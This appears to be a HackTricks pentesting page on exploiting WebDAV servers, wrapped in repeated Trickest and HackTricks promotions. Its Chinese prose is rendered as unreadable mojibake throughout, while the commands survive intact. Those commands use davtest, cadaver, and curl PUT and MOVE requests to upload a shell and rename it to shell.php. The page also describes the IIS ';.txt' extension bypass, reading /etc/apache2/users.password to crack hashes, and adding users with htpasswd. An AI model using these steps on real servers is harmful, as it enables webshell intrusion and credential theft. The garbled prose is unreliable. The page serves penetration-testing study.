# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) æ¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

å½“å¤„ç†å¯ç”¨äº† **WebDav çš„ HTTP æœåŠ¡å™¨** æ—¶ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æ­£ç¡®çš„ **å‡­æ®**ï¼ˆé€šå¸¸é€šè¿‡ **HTTP åŸºæœ¬èº«ä»½éªŒè¯**éªŒè¯ï¼‰ï¼Œåˆ™å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œ **æ“ä½œ**ã€‚é€šå¸¸ï¼Œæ§åˆ¶è¿™æ ·çš„æœåŠ¡å™¨å¾€å¾€æ¶‰åŠ **ä¸Šä¼ å’Œæ‰§è¡Œ Webshell**ã€‚

è®¿é—® WebDav æœåŠ¡å™¨é€šå¸¸éœ€è¦ **æœ‰æ•ˆçš„å‡­æ®**ï¼Œä½¿ç”¨ [**WebDav æš´åŠ›ç ´è§£**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) æ˜¯è·å–è¿™äº›å‡­æ®çš„å¸¸è§æ–¹æ³•ä¹‹ä¸€ã€‚

ä¸ºäº†å…‹æœæ–‡ä»¶ä¸Šä¼ çš„é™åˆ¶ï¼Œç‰¹åˆ«æ˜¯é‚£äº›é˜»æ­¢æœåŠ¡å™¨ç«¯è„šæœ¬æ‰§è¡Œçš„é™åˆ¶ï¼Œæ‚¨å¯ä»¥ï¼š

* å¦‚æœæ²¡æœ‰å—é™åˆ¶ï¼Œç›´æ¥**ä¸Šä¼ **å…·æœ‰**å¯æ‰§è¡Œæ‰©å±•å**çš„æ–‡ä»¶ã€‚
* å°†å·²ä¸Šä¼ çš„éå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ .txtï¼‰**é‡å‘½å**ä¸ºå¯æ‰§è¡Œæ‰©å±•åã€‚
* **å¤åˆ¶**å·²ä¸Šä¼ çš„éå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°†å…¶æ‰©å±•åæ›´æ”¹ä¸ºå¯æ‰§è¡Œçš„æ‰©å±•åã€‚

## DavTest

**Davtest** å°è¯•**ä¸Šä¼ å…·æœ‰ä¸åŒæ‰©å±•åçš„å¤šä¸ªæ–‡ä»¶**ï¼Œå¹¶**æ£€æŸ¥**æ˜¯å¦**æ‰§è¡Œ**äº†è¯¥æ‰©å±•åï¼š
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
```markdown
![](<../../.gitbook/assets/image (851).png>)

è¿™å¹¶ä¸æ„å‘³ç€ **.txt** å’Œ **.html æ‰©å±•åè¢«æ‰§è¡Œ**ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®è¿™äº›æ–‡ä»¶ã€‚

## Cadaver

ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥**è¿æ¥åˆ° WebDav** æœåŠ¡å™¨å¹¶**æ‰‹åŠ¨æ‰§è¡Œ**æ“ä½œï¼ˆå¦‚**ä¸Šä¼ **ã€**ç§»åŠ¨**æˆ–**åˆ é™¤**ï¼‰ã€‚
```
```
cadaver <IP>
```
## PUT è¯·æ±‚
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE è¯·æ±‚
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) æ¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–**ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## IIS5/6 WebDavæ¼æ´

è¿™ä¸ªæ¼æ´éå¸¸æœ‰è¶£ã€‚**WebDav** ä¸å…è®¸**ä¸Šä¼ **æˆ–**é‡å‘½å**æ‰©å±•åä¸º **.asp** çš„æ–‡ä»¶ã€‚ä½†æ˜¯ä½ å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶åæœ«å°¾**æ·»åŠ ** **";.txt"** æ¥**ç»•è¿‡**è¿™ä¸ªé™åˆ¶ï¼Œæ–‡ä»¶å°†è¢«æ‰§è¡Œä¸º .asp æ–‡ä»¶ï¼ˆä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ ".html" ä»£æ›¿ ".txt"ï¼Œä½†**ä¸è¦å¿˜è®° ";"**ï¼‰ã€‚

ç„¶åï¼Œä½ å¯ä»¥å°†ä½ çš„ shell ä¸Šä¼ ä¸º ".**txt" æ–‡ä»¶**ï¼Œå¹¶å°†å…¶**å¤åˆ¶/ç§»åŠ¨**ä¸º ".asp;.txt" æ–‡ä»¶ã€‚é€šè¿‡ Web æœåŠ¡å™¨è®¿é—®è¯¥æ–‡ä»¶ï¼Œå®ƒå°†è¢«**æ‰§è¡Œ**ï¼ˆcadaver ä¼šè¯´ç§»åŠ¨æ“ä½œå¤±è´¥ï¼Œä½†å®é™…ä¸Šæ˜¯æˆåŠŸçš„ï¼‰ã€‚

![](<../../.gitbook/assets/image (1092).png>)

## æäº¤å‡­æ®

å¦‚æœ Webdav ä½¿ç”¨çš„æ˜¯ Apache æœåŠ¡å™¨ï¼Œä½ åº”è¯¥æŸ¥çœ‹ Apache ä¸­é…ç½®çš„ç«™ç‚¹ã€‚é€šå¸¸åœ¨ï¼š\
_**/etc/apache2/sites-enabled/000-default**_

åœ¨å…¶ä¸­ä½ å¯èƒ½ä¼šæ‰¾åˆ°ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œè¿™é‡Œæœ‰åŒ…å«**webdav**æœåŠ¡å™¨æœ‰æ•ˆ**å‡­è¯**çš„æ–‡ä»¶ï¼š
```
/etc/apache2/users.password
```
åœ¨è¿™ç±»æ–‡ä»¶ä¸­ï¼Œä½ ä¼šæ‰¾åˆ°**ç”¨æˆ·å**å’Œ**å¯†ç çš„å“ˆå¸Œå€¼**ã€‚è¿™äº›æ˜¯ webdav æœåŠ¡å™¨ç”¨æ¥éªŒè¯ç”¨æˆ·èº«ä»½çš„å‡­æ®ã€‚

ä½ å¯ä»¥å°è¯•**ç ´è§£**å®ƒä»¬ï¼Œæˆ–è€…å¦‚æœå‡ºäºæŸç§åŸå› ä½ æƒ³è¦**è®¿é—®**è¿™ä¸ª**webdav**æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥**æ·»åŠ æ›´å¤š**å‡­æ®ï¼š
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
è¦æ£€æŸ¥æ–°å‡­æ®æ˜¯å¦æœ‰æ•ˆï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## å‚è€ƒ

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
